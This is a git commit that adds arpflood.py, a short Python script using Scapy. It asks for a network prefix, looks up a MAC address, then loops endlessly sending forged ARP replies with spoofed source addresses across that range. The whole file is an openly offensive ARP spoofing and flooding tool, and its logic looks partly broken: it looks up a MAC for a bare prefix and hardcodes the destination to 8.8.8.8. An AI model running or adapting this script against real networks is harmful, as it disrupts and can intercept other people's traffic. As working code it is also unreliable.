13b945a85587a113d8f111ff9dfc97751b056e44
robux-free <71077840+lmknjb12@users.noreply.github.com>
2024-06-23 22:26:29 +0900

    Add files via upload

---
+++ arpflood.py
@@ -0,0 +1,17 @@
+from scapy.all import Ether, srp, ARP, send
+
+def getMac(ip):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
+        
+print("8.8.8.8/24 -> 8.8.8.")
+targetip = input("network : ")
+targetmac = getMac(targetip)
+i = 0
+while (True):
+    ip = targetip + str(i)
+    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst=targetmac), verbose=0)
+    if (i > 255):
+        i = 0
+    i += 1
